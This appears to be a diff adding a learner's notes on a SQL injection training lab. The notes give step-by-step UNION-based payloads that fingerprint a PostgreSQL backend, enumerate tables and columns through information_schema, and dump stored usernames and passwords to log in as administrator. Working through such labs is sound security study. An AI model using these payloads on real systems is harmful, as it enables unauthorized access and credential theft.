@@ -1,0 +1,47 @@
+==>SQLi Lab 5:
+==>goal: listing the databse contents on non oracle database and login as administrator to solve the lab
+
+==>tools used:
+1. owasp-zap (proxy)
+2. foxyproxy
+3. browser
+4. nvim (documenting, notes)
+
+==> tasks:
+1. find out the table name that contains username and passwords
+2. in that table find the name of columns that contain username and password
+3. output the contents of the table and from that find the administrator's username and password
+4. log in as administrator
+
+>find the number of columns backend query is using
+payload: ' order by 3--
+there are 2 columns query is using
+
+>what are the datatype of those columns?
+payload: ' UNION SELECT 'a', 'a'--
+we find that both the columns use text(string) data type
+
+>what is the version of database we are using (so that we know what kind of db we are using to refine our payload)
+payload: postgresql: ' UNION SELECT version(), NULL--
+output: PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+as about we get our o/p now we know what kind of database is running on a backend, if it's wrong kind of db then o/p will throw a internal
+server error.
+
+>print of the table names stored in DB so we can find our desired table
+because we have postgresql on our hand we use that platform's query
+payload: ' UNION SELECT table_name, NULL FROM information_schema.tables--
+we find table named : users_ebpxle
+
+>find out the names of columns in that table
+so we can find the column names containing usernames and passwords
+payload: ' UNION SELECT column_name, NULL FROM information_schema.columns where table_name = 'users_ebpxle'--
+we find our column names
+username : username_pcsagv
+password : password_ebclmk
+
+>now we will print the columns and from them find the username and password of administrator
+payload: ' UNION SELECT username_pcsagv, password_ebclmk FROM users_ebpxle--
+we got username: administrator and password: 45oeaqyxr13sex2x0hiv
+
+>now the olny thing left to do is log in as admin with the username and password we found
+and we have successfully solved the lab... congrats
